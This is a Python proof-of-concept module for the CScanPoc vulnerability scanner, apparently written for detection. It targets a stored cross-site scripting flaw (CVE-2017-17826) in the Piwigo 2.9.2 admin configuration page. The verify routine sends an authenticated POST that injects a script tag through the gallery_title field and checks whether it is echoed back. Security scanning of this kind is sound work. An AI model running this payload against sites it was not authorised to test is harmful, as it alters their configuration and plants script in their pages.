# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Piwigo_0004_L'  # 平台漏洞编号，留空
    name = 'Piwigo Configuration组件跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2017-12-22'  # 漏洞公布时间
    desc = '''
        Piwigo是一个基于MySQL5与PHP5开发的相册系统.提供基本的发布和管理照片功能,按多种方式浏览如类别,标签,时间等。
        Piwigo 2.9.2版本中的Configuration组件存在跨站脚本漏洞。远程攻击者可借助admin.php?page=configuration§ion=main请求中的‘gallery_title’参数利用该漏洞劫持用户浏览器及储存在其中的数据。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-38279'  # 漏洞来源
    cnvd_id = 'CNVD-2017-38279'  # cnvd漏洞编号
    cve_id = 'CVE-2017-17826'  # cve编号
    product = 'Piwigo'  # 漏洞应用名称
    product_version = 'Piwigo 2.9.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7558ddde-be8b-431b-ba21-eddba6199e82'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookies': {
                    'type': 'string',
                    'description': 'cookies',
                    'default': ''
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/piwigo/admin.php?page=configuration&section=main'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
                'Referer': '%s/piwigo/admin.php?page=configuration' % self.target,
                'Cookie': '%s' % self.get_option('cookies')
            }
            data = "gallery_title=`</title><script>alert(cscan)</script>`&page_banner=test+banner&order_by%5B%5D=date_available+DESC&order_by%5B%5D=file+ASC&order_by%5B%5D=id+ASC&rate_anonymous=on&allow_user_registration=on&allow_user_customization=on&week_starts_on=monday&history_guest=on&log=on&mail_theme=clear&submit="
            url = self.target + payload
            r = requests.post(url, headers=headers, data=data)

            if "<script>alert(cscan)</script>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
